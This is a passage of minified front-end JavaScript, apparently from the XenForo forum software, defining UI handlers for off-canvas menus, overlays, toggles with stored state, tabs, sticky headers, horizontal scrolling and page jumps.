        if (a) if (XF.OffCanvasBuilder[a]) XF.OffCanvasBuilder[a](this.$menu, this);else console.error("No off canvas builder " + a + " found");
      } else console.error("No menu found for %o", this.$target[0]);
    },
    click: function (a) {
      a.preventDefault();
      this.toggle();
    },
    isOpen: function () {
      return this.$menu.hasClass(this.options.openClass);
    },
    toggle: function () {
      this.isOpen() ? this.close() : this.open();
    },
    openTrigger: function (a) {
      a.preventDefault();
      this.open();
    },
    open: function () {
      if (!this.isOpen()) {
        var a = this.$menu;
        this.addOcmClasses(a);
        a.attr("aria-hidden", "false").trigger("off-canvas:opening");
        a.addClassTransitioned(this.options.openClass, function () {
          a.trigger("off-canvas:opened");
        });
        XF.Modal.open();
      }
    },
    addOcmClasses: function (a) {
      var b = a.attr("data-ocm-class");
      b && a.addClass(b);
      a.find("[data-ocm-class]").each(function () {
        var a = d(this);
        a.addClass(a.attr("data-ocm-class"));
      });
    },
    removeOcmClasses: function (a) {
      var b = a.attr("data-ocm-class");
      b && a.removeClass(b);
      a.find("[data-ocm-class]").each(function () {
        var a = d(this);
        a.removeClass(a.attr("data-ocm-class"));
      });
    },
    closeTrigger: function (a, b) {
      a.preventDefault();
      this.close(b && b.instant);
    },
    close: function (a) {
      if (this.isOpen()) {
        var b = this.$menu,
          c = this;
        b.attr("aria-hidden", "true").trigger("off-canvas:closing");
        b.removeClassTransitioned(this.options.openClass, function () {
          b.trigger("off-canvas:closed");
          c.removeOcmClasses(b);
        }, a);
        XF.Modal.close();
      }
    }
  });
  XF.OffCanvasBuilder = {
    navigation: function (a, b) {
      a.appendTo("body");
      var c = d('<ul class="offCanvasMenu-list" />');
      d(".js-offCanvasNavSource .p-navEl").each(function () {
        var a = d(this),
          b = a.hasClass("is-selected"),
          g = a.find(".p-navEl-link"),
          f = a.find("[data-menu]");
        a.data("has-children") && !f.length && (a = a.find('[data-xf-click~="menu"]').first().data("xf-click-handlers")) && a.menu && (f = a.menu.$menu);
        if (g.length) {
          a = d('<div class="offCanvasMenu-linkHolder" />');
          var h = g.clone();
          g = d("<li />");
          h.removeClass("p-navEl-link p-navEl-link--menuTrigger p-navEl-link--splitMenu").addClass("offCanvasMenu-link");
          a.html(h);
          b && (g.addClass("is-selected"), a.addClass("is-selected"));
          g.html(a);
          if (f.length) {
            h = d('<a class="offCanvasMenu-link offCanvasMenu-link--splitToggle" data-xf-click="toggle" data-target="< :up :next" role="button" tabindex="0" />');
            b && h.addClass("is-active");
            a.append(h);
            var n = d('<ul class="offCanvasMenu-subList" />');
            b && n.addClass("is-active");
            f.find(".menu-linkRow").each(function () {
              var a = d(this),
                b = d("<li />");
              b.html(a.clone().removeClass("menu-linkRow").addClass("offCanvasMenu-link"));
              n.append(b);
            });
            g.append(n);
          }
          c.append(g);
        }
      });
      a = a.find(".js-offCanvasNavTarget").append(c);
      XF.activate(a);
    },
    sideNav: function (a, b) {
      var c = a.find(".offCanvasMenu-content"),
        e = b.$target;
      c.find("[data-menu-close]").length || (b = c.find(".block-header").first(), b.length || (b = d('<div class="offCanvasMenu-header offCanvasMenu-header--separated offCanvasMenu-shown" />'), b.html(e.html()), c.prepend(b)), b.append('<a class="offCanvasMenu-closer" data-menu-close="true" role="button" tabindex="0" />'));
      d(f).onPassive("resize", function () {
        e.is(":visible") || a.trigger("off-canvas:close");
      });
    },
    simple: function (a, b) {
      a.appendTo("body");
      var c = d('<ul class="offCanvasMenu-list" />'),
        e = a.data("ocm-link-remove-class");
      d(a.data("ocm-link-target")).each(function () {
        var a = d(this),
          b = d('<div class="offCanvasMenu-linkHolder" />');
        a = a.clone().addClass("offCanvasMenu-link");
        var f = d("<li />");
        e && a.removeClass(e);
        b.html(a);
        f.html(b);
        c.append(f);
      });
      a = a.find(".js-offCanvasTarget").append(c);
      XF.activate(a);
    }
  };
  XF.OverlayClick = XF.Event.newHandler({
    eventNameSpace: "XFOverlayClick",
    options: {
      cache: !0,
      overlayConfig: {},
      forceFlashMessage: !1,
      followRedirects: !1,
      closeMenus: !0
    },
    overlay: null,
    loadUrl: null,
    loading: !1,
    visible: !1,
    init: function () {
      var a = this.getOverlayHtml();
      if (a) this.setupOverlay(new XF.Overlay(a, this.options.overlayConfig));else {
        a = this.getLoadUrl();
        if (!a) throw Error("Could not find an overlay for target");
        this.loadUrl = a;
      }
      this.options.closeMenus && XF.MenuWatcher.closeAll();
    },
    click: function (a) {
      a.preventDefault();
      this.toggle();
    },
    toggle: function () {
      this.overlay ? this.overlay.toggle() : this.show();
    },
    show: function () {
      if (this.overlay) this.overlay.show();else if (!this.loading) {
        this.loading = !0;
        var a = this,
          b = {
            cache: this.options.cache,
            beforeShow: function (b) {
              a.overlay = b;
            },
            init: XF.proxy(this, "setupOverlay")
          };
        this.options.followRedirects && (b.onRedirect = function (b, e) {
          a.options.forceFlashMessage ? XF.flashMessage(b.message, 1E3, function () {
            XF.redirect(b.redirect);
          }) : XF.redirect(b.redirect);
        });
        (b = XF.loadOverlay(this.loadUrl, b, this.options.overlayConfig)) ? b.always(function () {
          setTimeout(function () {
            a.loading = !1;
          }, 300);
        }) : this.loading = !1;
      }
    },
    hide: function () {
      this.overlay && this.overlay.hide();
    },
    getOverlayHtml: function () {
      var a = this.$target,
        b = a.data("target");
      if (b) {
        var c = a.find(b).eq(0);
        c.length || (c = d(b).eq(0));
      }
      c && c.length || (a = a.attr("href")) && "#" == a.substr(0, 1) && (c = d(a).eq(0));
      c && c.length && !c.is(".overlay") && (c = XF.getOverlayHtml(c));
      return c && c.length ? c : null;
    },
    getLoadUrl: function () {
      var a = this.$target;
      return a.data("href") || a.attr("href") || null;
    },
    setupOverlay: function (a) {
      this.overlay = a;
      var b = this;
      a.on({
        "overlay:shown": function () {
          b.visible = !0;
        },
        "overlay:hidden": function () {
          b.visible = !1;
        }
      });
      if (!this.options.cache && this.loadUrl) a.on("overlay:hidden", function () {
        b.overlay = null;
      });
      return this.overlay;
    }
  });
  XF.OverlayClick.overlayCache = {};
  XF.ToggleClick = XF.Event.newHandler({
    eventNameSpace: "XFToggleClick",
    options: {
      target: null,
      container: null,
      hide: null,
      activeClass: "is-active",
      activateParent: null,
      scrollTo: null
    },
    $toggleTarget: null,
    $toggleParent: null,
    toggleUrl: null,
    ajaxLoaded: !1,
    loading: !1,
    init: function () {
      this.$toggleTarget = XF.getToggleTarget(this.options.target, this.$target);
      if (!this.$toggleTarget) return !1;
      this.options.activateParent && (this.$toggleParent = this.$target.parent());
      this.toggleUrl = this.getToggleUrl();
    },
    click: function (a) {
      a.preventDefault();
      this.$toggleTarget && this.toggle();
    },
    isVisible: function () {
      return this.$toggleTarget.hasClass(this.options.activeClass);
    },
    isTransitioning: function () {
      return this.$toggleTarget.hasClass("is-transitioning");
    },
    toggle: function () {
      this.isVisible() ? this.hide() : this.show();
      this.$target.blur();
    },
    load: function () {
      var a = this.toggleUrl,
        b = this;
      a && !this.loading && (this.loading = !0, XF.ajax("get", a, function (a) {
        a.html && XF.setupHtmlInsert(a.html, function (a, c, d) {
          if (c = b.$toggleTarget.data("load-selector")) c = a.find(c).first(), c.length && (a = c);
          b.ajaxLoaded = !0;
          b.$toggleTarget.append(a);
          XF.activate(a);
          d(!0);
          b.show();
          return !1;
        });
      }).always(function () {
        b.ajaxLoaded = !0;
        b.loading = !1;
      }));
    },
    hide: function (a) {
      if (this.isVisible() && !this.isTransitioning()) {
        var b = this.options.activeClass;
        this.$toggleParent && this.$toggleParent.removeClassTransitioned(b, XF.proxy(this, "inactiveTransitionComplete"), a);
        this.$toggleTarget && this.$toggleTarget.removeClassTransitioned(b, XF.proxy(this, "inactiveTransitionComplete"), a);
        this.$target.removeClassTransitioned(b, XF.proxy(this, "inactiveTransitionComplete"), a);
      }
    },
    show: function (a) {
      if (!this.isVisible() && !this.isTransitioning() && !this.getOtherToggles().filter(".is-transitioning").length) if (this.toggleUrl && !this.ajaxLoaded) this.load();else {
        this.closeOthers();
        var b = this.options.activeClass;
        this.$toggleParent && this.$toggleParent.addClassTransitioned(b, this.activeTransitionComplete, a);
        this.$toggleTarget && this.$toggleTarget.addClassTransitioned(b, this.activeTransitionComplete, a);
        this.$target.addClassTransitioned(b, this.activeTransitionComplete, a);
        this.hideSpecified();
        this.scrollTo();
        XF.autoFocusWithin(this.$toggleTarget, "[autofocus], [data-toggle-autofocus]");
      }
    },
    activeTransitionComplete: function (a) {
      d(this).trigger("toggle:shown");
      XF.layoutChange();
    },
    inactiveTransitionComplete: function (a) {
      d(this).trigger("toggle:hidden");
      XF.layoutChange();
    },
    closeOthers: function () {
      this.getOtherToggles().each(function () {
        var a = d(this).data("xf-click-handlers");
        a || (a = XF.Event.initElement(this, "click"));
        a && a.toggle && a.toggle.hide(!0);
      });
    },
    hideSpecified: function () {
      var a = d(this.options.hide);
      a && a.length && a.hide();
    },
    scrollTo: function () {
      if (this.options.scrollTo) {
        var a = this.$toggleTarget,
          b = a.offset().top;
        a = a.height();
        var c = d(f).height();
        XF.smoothScroll(a < c ? b - (c / 2 - a / 2) : b);
      }
    },
    getToggleUrl: function () {
      var a = this.$toggleTarget,
        b;
      return a && (b = a.data("href")) ? "trigger-href" == b ? this.$target.attr("href") : b : null;
    },
    getContainer: function () {
      if (this.options.container) {
        var a = this.$target.closest(this.options.container);
        if (a.length) return a;
        console.error("Container parent not found: " + this.options.container);
      }
      return null;
    },
    getOtherToggles: function () {
      var a = this.getContainer();
      return a && a.length ? a.find("[data-xf-click~=toggle]").not(this.$target[0]) : d([]);
    }
  });
  XF.getToggleTarget = function (a, b) {
    a = a ? XF.findRelativeIf(a, b) : b.next();
    if (!a.length) throw Error("No toggle target for %o", b);
    return a;
  };
  XF.ToggleStorage = XF.Element.newHandler({
    options: {
      storageType: "local",
      storageContainer: "toggle",
      storageKey: null,
      storageExpiry: 86400,
      target: null,
      container: null,
      hide: null,
      activeClass: "is-active",
      activateParent: null
    },
    targetId: null,
    storage: null,
    init: function () {
      var a = this.options.storageContainer;
      if (!a) throw Error("Storage container not specified for ToggleStorage handler");
      var b = this.options.storageKey;
      if (!b) throw Error("Storage key not specified for ToggleStorage handler");
      this.storage = XF.ToggleStorageData.getInstance(this.options.storageType);
      if (!this.storage) throw Error("Invalid storage type " + this.options.storageType);
      b = this.storage.get(a, b, {
        allowExpired: !1,
        touch: !1
      });
      if (null !== b) {
        var c = XF.getToggleTarget(this.options.target, this.$target);
        if (c.length) {
          var e = this.options.activeClass;
          this.$target.toggleClass(e, b);
          c.toggleClass(e, b);
        }
      }
      this.storage.prune(a);
      this.$target.on("xf-click:after-click.XFToggleClick", XF.proxy(this, "updateStorage"));
    },
    updateStorage: function () {
      var a = this.options;
      this.storage.set(a.storageContainer, a.storageKey, this.$target.hasClass(a.activeClass), a.storageExpiry);
    }
  });
  XF.ToggleStorageDataInstance = XF.create({
    storage: null,
    dataCache: {},
    syncTimers: {},
    pruneTimers: {},
    __construct: function (a) {
      this.storage = a;
    },
    getStorage: function () {
      return this.storage;
    },
    get: function (a, b, c) {
      c || (c = {});
      var e = !0,
        d = !0;
      c.hasOwnProperty("allowExpired") && (e = c.allowExpired);
      c.hasOwnProperty("touch") && (d = c.touch);
      this.dataCache[a] || (this.dataCache[a] = this.storage.getJson(a));
      c = this.dataCache[a];
      if (!c.hasOwnProperty(b)) return null;
      c = c[b];
      var g = Math.floor(Date.now() / 1E3);
      if (!e && c[0] + c[1] < g) return delete this.dataCache[a][b], this.scheduleSync(a), null;
      d && (c[0] = g, this.dataCache[a][b] = c, this.scheduleSync(a));
      return c[2];
    },
    set: function (a, b, c, e) {
      this.dataCache[a] || (this.dataCache[a] = {});
      e || (e = 14400);
      var d = Math.floor(Date.now() / 1E3);
      this.dataCache[a][b] = [d, e, c];
      this.scheduleSync(a);
    },
    remove: function (a, b) {
      this.dataCache[a] || (this.dataCache[a] = {});
      delete this.dataCache[a][b];
      this.scheduleSync(a);
    },
    prune: function (a, b) {
      var c = this.pruneTimers[a],
        e = this,
        d = function () {
          clearTimeout(c);
          e.pruneTimers[a] = null;
          e.pruneInternal(a);
        };
      b ? d() : c || (this.pruneTimers[a] = setTimeout(d, 100));
    },
    pruneInternal: function (a) {
      this.dataCache[a] || (this.dataCache[a] = this.storage.getJson(a));
      var b = this.dataCache[a],
        c = Math.floor(Date.now() / 1E3),
        e = !1,
        d;
      for (d in b) if (b.hasOwnProperty(d)) {
        var g = b[d];
        g[0] + g[1] < c && (delete b[d], e = !0);
      }
      e && (this.dataCache[a] = b, this.scheduleSync(a));
    },
    scheduleSync: function (a, b) {
      var c = this.syncTimers[a],
        e = this,
        d = function () {
          clearTimeout(c);
          e.syncTimers[a] = null;
          e.syncToStorage(a);
        };
      b ? d() : c || (e.syncTimers[a] = setTimeout(d, 100));
    },
    syncToStorage: function (a) {
      if (this.dataCache[a]) {
        var b = this.dataCache[a];
        if (d.isEmptyObject(b)) this.storage.remove(a);else if (this.storage.supportsExpiryDate()) {
          var c = XF.getFutureDate(1, "year");
          this.storage.setJson(a, b, c);
        } else this.storage.setJson(a, b);
      }
    }
  });
  XF.ToggleStorageData = function () {
    var a = {
        local: new XF.ToggleStorageDataInstance(XF.LocalStorage),
        cookie: new XF.ToggleStorageDataInstance(XF.Cookie)
      },
      b = a.local;
    return {
      getInstance: function (b) {
        return a[b];
      },
      get: function (a, d, f) {
        return b.get(a, d, f);
      },
      set: function (a, d, f, g) {
        return b.set(a, d, f, g);
      },
      remove: function (a, d) {
        return b.remove(a, d);
      },
      prune: function (a, d) {
        return b.prune(a, d);
      }
    };
  }();
  XF.ToggleClassClick = XF.Event.newHandler({
    eventNameSpace: "XFToggleClassClick",
    options: {
      class: null
    },
    init: function () {},
    click: function (a) {
      this.options.class && this.toggle();
    },
    toggle: function () {
      this.$target.toggleClass(this.options.class);
    }
  });
  XF.HScroller = XF.Element.newHandler({
    options: {
      scrollerClass: "hScroller-scroll",
      actionClass: "hScroller-action",
      autoScroll: ".tabs-tab.is-active"
    },
    $scrollTarget: null,
    $goStart: null,
    $goEnd: null,
    init: function () {
      var a = this.$target.find("." + this.options.scrollerClass).first();
      if (a.length) {
        this.$scrollTarget = a;
        var b,
          c,
          e = this;
        a.on("mousedown.horizontalScroller", function (a) {
          a.button || (b = a.clientX, c = !1, a.preventDefault(), XF.isEventTouchTriggered(a) && (a = d(h.activeElement), a.is(":input") && a.blur()), d(f).on("mouseup.horizontalScroller", function (a) {
            d(f).off(".horizontalScroller");
            c && a.preventDefault();
          }).on("mousemove.horizontalScroller", function (a) {
            var d = b - a.clientX;
            0 != d && (e.move(d) && (c = !0), b = a.clientX);
          }));
        }).on("click.horizontalScroller", function (a) {
          c && (a.preventDefault(), a.stopImmediatePropagation(), c = !1);
        }).on("scroll.horizontalScroller", XF.proxy(this, "updateScroll")).on("tab:click.horizontalScroller", function (a) {
          c && a.preventDefault();
        });
        var k = XF.measureScrollBar(null, "height");
        a.addClass("is-calculated");
        0 != k && a.css("margin-bottom", parseInt(a.css("margin-bottom"), 10) - k + "px");
        k = this.options.actionClass;
        this.$goStart = d('<i class="' + k + " " + k + '--start" aria-hidden="true" />').click(function () {
          e.step(-1);
        }).insertAfter(a);
        this.$goEnd = d('<i class="' + k + " " + k + '--end" aria-hidden="true" />').click(function () {
          e.step(1);
        }).insertAfter(a);
        this.updateScroll();
        d(h.body).on("xf:layout", XF.proxy(this, "updateScroll"));
        var g;
        d(f).on("resize", function () {
          g && clearTimeout(g);
          g = setTimeout(XF.proxy(e, "updateScroll"), 100);
        });
        var l = a.find(this.options.autoScroll).first();
        if (l.length) {
          k = this.$target.width();
          var m = l.position();
          l = l.outerWidth();
          m = m.left;
          l = m + l;
          XF.isRtl() ? 80 > m && a.normalizedScrollLeft(-l + k - 50) : l > k && (l + 80 > k ? a.normalizedScrollLeft(m - 50) : a.normalizedScrollLeft(m - 80));
        }
      } else console.error("no scroll target");
    },
    scrollToStart: function () {
      this.scrollTo(0);
    },
    scrollToEnd: function () {
      this.scrollTo(this.$scrollTarget[0].scrollWidth);
    },
    scrollTo: function (a) {
      this.$scrollTarget.animate({
        scrollLeft: a
      }, 150);
    },
    move: function (a) {
      var b = this.$scrollTarget,
        c = b.normalizedScrollLeft();
      XF.isRtl() && (a *= -1);
      b.normalizedScrollLeft(c + a);
      return b.normalizedScrollLeft() !== c;
    },
    step: function (a) {
      var b = Math.max(125, Math.floor(.25 * this.$scrollTarget.width())),
        c = "+=";
      switch (d.support.scrollLeftType) {
        case "inverted":
        case "negative":
          c = "-=";
      }
      this.scrollTo(c + a * b);
    },
    updateScroll: function () {
      var a = this.$scrollTarget[0],
        b = this.$scrollTarget.normalizedScrollLeft();
      a = a.offsetWidth + b + 1 < a.scrollWidth;
      this.$goStart[0 < b ? "addClass" : "removeClass"]("is-active");
      this.$goEnd[a ? "addClass" : "removeClass"]("is-active");
    }
  });
  XF.ResponsiveDataList = XF.Element.newHandler({
    options: {
      headerRow: ".dataList-row--header",
      headerCells: "th, td",
      rows: ".dataList-row:not(.dataList-row--subSection, .dataList-row--header)",
      rowCells: "td",
      triggerWidth: "narrow"
    },
    $headerRow: null,
    headerText: [],
    $rows: null,
    isResponsive: !1,
    init: function () {
      var a = this.$target.find(this.options.headerRow).first(),
        b = [];
      a.find(this.options.headerCells).each(function () {
        var a = d(this),
          e = a.text();
        a = parseInt(a.attr("colspan"), 10);
        b.push(d.trim(e));
        if (1 < a) for (e = 1; e < a; e++) b.push("");
      });
      this.$headerRow = a;
      this.headerText = b;
      this.$rows = this.$target.find(this.options.rows);
      this.process();
      d(h).on("breakpoint:change", XF.proxy(this, "process"));
    },
    process: function () {
      var a = XF.Breakpoint.isAtOrNarrowerThan(this.options.triggerWidth);
      a && this.isResponsive || !a && !this.isResponsive || (a ? this.apply() : this.remove());
    },
    apply: function () {
      var a = this;
      this.$rows.each(function () {
        a.processRow(d(this), !0);
      });
      this.$target.addClass("dataList--responsive");
      this.$headerRow.addClass("dataList-row--headerResponsive");
      this.isResponsive = !0;
    },
    remove: function () {
      var a = this;
      this.$rows.each(function () {
        a.processRow(d(this), !1);
      });
      this.$target.removeClass("dataList--responsive");
      this.$headerRow.removeClass("dataList-row--headerResponsive");
      this.isResponsive = !1;
    },
    processRow: function (a, b) {
      var c = 0,
        e = this.headerText;
      a.find(this.options.rowCells).each(function () {
        var a = d(this);
        if (b) {
          var g = e[c];
          g && g.length && !a.data("hide-label") ? a.attr("data-cell-label", g) : a.removeAttr("data-cell-label");
        } else a.removeAttr("data-cell-label");
        c++;
      });
    }
  });
  XF.Sticky = XF.Element.newHandler({
    options: {
      parent: null,
      inner_scrolling: !0,
      sticky_class: "is-sticky",
      offset_top: null,
      spacer: null,
      bottoming: null,
      recalc_every: null
    },
    init: function () {
      "false" == this.options.spacer && (this.options.spacer = !1);
      this.$target.stick_in_parent(this.options);
    }
  });
  XF.StickyHeader = XF.Element.newHandler({
    options: {
      stickyClass: "is-sticky",
      stickyBrokenClass: "is-sticky-broken",
      stickyDisabledClass: "is-sticky-disabled",
      minWindowHeight: 251
    },
    active: null,
    supportsSticky: !1,
    stickyBroken: !1,
    windowTooSmall: !1,
    init: function () {
      var a = this.$target.css("position");
      a = "sticky" == a || "-webkit-sticky" == a;
      var b = !1;
      if (a) {
        var c = f.navigator.userAgent,
          e = c.match(/Chrome\/(\d+)/);
        e && 60 > parseInt(e[1], 10) && (b = !0, a = !1);
        (e = c.match(/ Edge\/(\d+)/)) && 17 <= parseInt(e[1], 10) && XF.isRtl() && (b = !0, a = !1);
      }
      this.supportsSticky = a;
      this.stickyBroken = b;
      this.update();
      d(f).on("resize.sticky-header", XF.proxy(this, "update"));
      XF.StickyHeader.cache.push(this);
    },
    update: function () {
      (this.windowTooSmall = d(f).height() < this.options.minWindowHeight) ? !1 !== this.active && this._disable() : this.active || this._enable();
    },
    _enable: function () {
      this.active = !0;
      var a = this.$target,
        b = this.options.stickyClass,
        c = this.options.stickyBrokenClass;
      a.removeClass(this.options.stickyDisabledClass);
      if (this.supportsSticky) {
        var e = !1,
          k = parseInt(a.css("top"), 10),
          g = XF.isIOS(),
          h,
          m = function (c) {
            var d = Math.floor(a[0].getBoundingClientRect().top);
            d < k || d == k && 0 < f.scrollY ? e || (a.addClass(b), XF.layoutChange(), e = !0) : e && (g && c ? (clearTimeout(h), h = setTimeout(function () {
              m(!1);
            }, 200)) : (a.removeClass(b), XF.layoutChange(), e = !1));
          };
        d(f).on("scroll.sticky-header", function () {
          m(!0);
        });
        m(!1);
      } else this.stickyBroken && setTimeout(function () {
        a.addClass(c);
      }, 0), a.stick_in_parent({
        sticky_class: b
      });
    },
    _disable: function () {
      this.active = !1;
      var a = this.$target,
        b = this.options.stickyClass,
        c = this.options.stickyBrokenClass,
        e = this.options.stickyDisabledClass;
      this.supportsSticky ? d(f).off("scroll.sticky-header") : a.trigger("sticky_kit:detach").removeData("sticky_kit");
      a.removeClass(b).removeClass(c).addClass(e);
    }
  });
  XF.StickyHeader.cache = [];
  XF.Tabs = XF.Element.newHandler({
    options: {
      tabs: ".tabs-tab",
      panes: null,
      activeClass: "is-active",
      state: null,
      preventDefault: !0
    },
    initial: 0,
    $tabs: null,
    $panes: null,
    $activeTab: null,
    $activePane: null,
    init: function () {
      var a = this.$target;
      var b = this.$tabs = a.find(this.options.tabs);
      a = this.options.panes ? XF.findRelativeIf(this.options.panes, a) : a.next();
      a.is("ol, ul") && (a = a.find("> li"));
      this.$panes = a;
      if (b.length != a.length) console.error("Tabs and panes contain different totals: %d tabs, %d panes", b.length, a.length), console.error("Tabs: %o, Panes: %o", b, a);else {
        for (a = 0; a < b.length; a++) if (b.eq(a).hasClass(this.options.activeClass)) {
          this.initial = a;
          break;
        }
        b.on("click", XF.proxy(this, "tabClick"));
        d(f).on("hashchange", XF.proxy(this, "onHashChange"));
        d(f).on("popstate", XF.proxy(this, "onPopState"));
        this.reactToHash();
      }
    },
    getSelectorFromHash: function () {
      var a = "";
      if (1 < f.location.hash.length) {
        var b = f.location.hash.replace(/[^a-zA-Z0-9_-]/g, "");
        b && b.length && (a = "#" + b);
      }
      return a;
    },
    reactToHash: function () {
      var a = this.getSelectorFromHash();
      a ? this.activateTarget(a) : this.activateTab(this.initial);
    },
    onHashChange: function (a) {
      this.reactToHash();
    },
    onPopState: function (a) {
      (a = a.originalEvent.state) && a.id ? this.activateTarget("#" + a.id, !1) : a && a.offset ? this.activateTab(a.offset) : this.activateTab(this.initial);
    },
    activateTarget: function (a) {
      var b = this.$tabs,
        c = !1,
        e = !1;
      if (a) {
        try {
          var f = d(a);
          c = f && 0 < f.length;
        } catch (g) {
          c = !1;
        }
        if (c) for (c = 0; c < b.length; c++) b.eq(c).is(a) && (this.activateTab(c), e = !0);
      }
      e || this.activateTab(this.initial);
    },
    activateTab: function (a) {
      var b = this.$tabs.eq(a),
        c = this.$panes.eq(a),
        d = this.options.activeClass;
      b.length && c.length ? (this.$tabs.filter("." + d).removeClass(d).attr("aria-selected", "false").trigger("tab:hidden"), this.$panes.filter("." + d).removeClass(d).attr("aria-expanded", "false").trigger("tab:hidden"), b.addClass(d).attr("aria-selected", "true").trigger("tab:shown"), c.addClass(d).attr("aria-expanded", "true").trigger("tab:shown"), XF.layoutChange(), c.data("href") && !c.data("tab-loading") && (c.data("tab-loading", !0), XF.ajax("get", c.data("href"), {}, function (a) {
        c.data("href", !1);
        if (a.html) {
          var b = c.data("load-target");
          b ? XF.setupHtmlInsert(a.html, c.find(b)) : XF.setupHtmlInsert(a.html, c);
        }
      }).always(function () {
        c.data("tab-loading", !1);
      }))) : console.error("Selected invalid tab " + a);
    },
    tabClick: function (a) {
      var b = a.currentTarget,
        c = this.$tabs.index(b);
      if (-1 == c) console.error("Did not find clicked element (%o) in tabs", b);else {
        b = this.$tabs.eq(c);
        var e = d.Event("tab:click");
        b.trigger(e, this);
        if (!e.isDefaultPrevented()) {
          this.options.preventDefault && a.preventDefault();
          if (this.options.state) switch (a = f.location.href.split("#")[0], b.attr("id") ? (a = a + "#" + b.attr("id"), b = {
            id: b.attr("id")
          }) : b = {
            offset: c
          }, this.options.state) {
            case "replace":
              f.history.replaceState(b, "", a);
              break;
            case "push":
              f.history.pushState(b, "", a);
          }
          this.activateTab(c);
        }
      }
    }
  });
  XF.PageJump = XF.Element.newHandler({
    options: {
      pageUrl: null,
      pageInput: "| .js-pageJumpPage",
      pageSubmit: "| .js-pageJumpGo",
      sentinel: "%page%"
    },
    $input: null,
    init: function () {
      var a = this;
      this.options.pageUrl ? (this.$input = XF.findRelativeIf(this.options.pageInput, this.$target), this.$input.length ? (this.$input.on("keyup", function (b) {
        "Enter" == b.key && (b.preventDefault(), a.go());
      }), XF.findRelativeIf(this.options.pageSubmit, this.$target).on("click", function (b) {
        b.preventDefault();
        a.go();
      }), this.$target.closest(".menu").on("menu:opened", function () {
        a.shown();
      })) : console.error("No input provided to page jump")) : console.error("No page-url provided to page jump");
    },
    shown: function () {
      this.$input.select();
    },
    go: function () {
      var a = parseInt(this.$input.val(), 10);
      1 > a && (a = 1);
      var b = this.options.pageUrl,
        c = this.options.sentinel,
        d = b.replace(c, a);
      d == b && (d = b.replace(encodeURIComponent(c), a));
      XF.redirect(d);
    }
  });
  XF.QuickSearch = XF.Element.newHandler({
    options: {
      select: "| .js-quickSearch-constraint"
    },
    $select: null,
    init: function () {
      this.$select = XF.findRelativeIf(this.options.select, this.$target);
      this.$select.on("change", XF.proxy(this, "updateSelectWidth"));
      this.updateSelectWidth();
    },
    updateSelectWidth: function () {
      if (this.$select.length) {
        var a = d("<span />").addClass(this.$select.attr("class")).addClass("input--select"),
          b = this.$select.find("option:selected");
        b.length || (b = this.$select.find("option").first());
        a.text(b.text());
        a.css("display", "inline");
        b = d("<div />");
        b.css({
          position: "absolute",
          top: -200,
          visibility: "hidden"
        });
        b.css(XF.isRtl() ? "right" : "left", -9999);
        a.appendTo(b);
        b.appendTo("body");
        this.$select.css({
          width: a.outerWidth() + 8,
          "flex-grow": 0,
          "flex-shrink": 0
        });
        b.remove();
      }
    }
  });
  XF.TouchProxy = XF.Element.newHandler({
    options: {
      allowed: ":input, :checkbox, a, label, [data-tp-clickable], [data-tp-primary]"
    },
    active: !0,
    timer: null,
    $proxy: null,
    init: function () {
      var a = this;
      if ("InputDeviceCapabilities" in f || "sourceCapabilities" in UIEvent.prototype) this.$target.click(function (b) {
        var c = b.originalEvent;
        c && c.sourceCapabilities && c.sourceCapabilities.firesTouchEvents && a.handleTapEvent(b);
      });else if (XF.Feature.has("touchevents")) {
        var b = !1;
        this.$target.on("touchstart", function () {
          b = !1;
        }).on("touchmove", function () {
          b = !0;
        }).on("touchend", function (c) {
          b || a.handleTapEvent(c);
        });
      }
    },
    isClickable: function (a) {
      a = d(a).closest(this.options.allowed);
      return !(!a.length || !this.$target.find(a).length);
    },
    handleTapEvent: function (a) {
      this.getProxy().length && this.active && !this.isClickable(a.target) && (a.preventDefault(), this.trigger());
    },
    getProxy: function () {
      if (!this.$proxy) {
        var a = this.$target.find("[data-tp-primary]").first();
        a.length || (a = this.$target.find("a[href]").first());
        this.$proxy = a;
      }
      return this.$proxy;
    },
    trigger: function (a) {
      a = this.getProxy();
      if (a.length) {
        this.timer && clearTimeout(this.timer);
        this.active = !1;
        a[0].click ? a[0].click() : a.click();
        var b = this;
        this.timer = setTimeout(function () {
          b.active = !0;
        }, 500);
      }
    }
  });
  XF.ShifterClick = XF.Event.newHandler({
    eventNameSpace: "XFShifterClick",
    options: {
      selector: null,
      dir: "up"
    },
    $element: null,
    init: function () {
      this.$element = this.$target.closest(this.options.selector);
    },
    click: function (a) {
      "down" == this.options.dir ? this.$element.insertAfter(this.$element.next()) : this.$element.insertBefore(this.$element.prev());
    }
  });
  XF.VideoInit = XF.Element.newHandler({
    options: {},
    video: null,
    loaded: !1,
    init: function () {
      XF.isIOS() && (this.video = this.$target[0].cloneNode(!0), this.video.load(), this.video.addEventListener("loadeddata", XF.proxy(this, "hasLoaded")), this.video.addEventListener("seeked", XF.proxy(this, "hasSeeked")));
    },
    hasLoaded: function () {
      this.loaded || (this.loaded = !0, this.video.currentTime = 0);
    },
    hasSeeked: function () {
      var a = d("<canvas />")[0],
        b = this.$target.width(),
        c = this.$target.height(),
        e = a.getContext("2d");
      a.width = b;
      a.height = c;
      e.drawImage(this.video, 0, 0, b, c);
      if (a) {
        var f = this;
        a.toBlob(function (a) {
          a && (a = URL.createObjectURL(a), f.$target.attr("poster", a));
        });
      }
    }
  });
  XF.RemoverClick = XF.Event.newHandler({
    eventNameSpace: "XFRemoverClick",
    options: {
      selector: null
    },
    $targetElement: null,
    init: function () {
      this.$targetElement = XF.findRelativeIf(this.options.selector, this.$target);
    },
    click: function (a) {
      this.$targetElement.length && (this.$targetElement.remove(), XF.layoutChange());
    }
  });
  XF.DuplicatorClick = XF.Event.newHandler({
    eventNameSpace: "XFDuplicatorClick",
    options: {
      selector: null
    },
    $targetElement: null,
    init: function () {
      this.$targetElement = XF.findRelativeIf(this.options.selector, this.$target);
    },
    click: function (a) {
      this.$targetElement.length && (a = this.$targetElement.clone(!0).insertAfter(this.$targetElement), XF.layoutChange(), this.$targetElement.closest("[data-xf-init~=list-sorter]").length && d(f).trigger("listSorterDuplication", a));
    }
  });
  XF.Event.register("click", "inserter", "XF.InserterClick");
  XF.Event.register("click", "menu", "XF.MenuClick");
  XF.Event.register("click", "menu-proxy", "XF.MenuProxy");
  XF.Event.register("click", "off-canvas", "XF.OffCanvasClick");
  XF.Event.register("click", "overlay", "XF.OverlayClick");
  XF.Event.register("click", "toggle", "XF.ToggleClick");
  XF.Event.register("click", "toggle-class", "XF.ToggleClassClick");
  XF.Event.register("click", "shifter", "XF.ShifterClick");
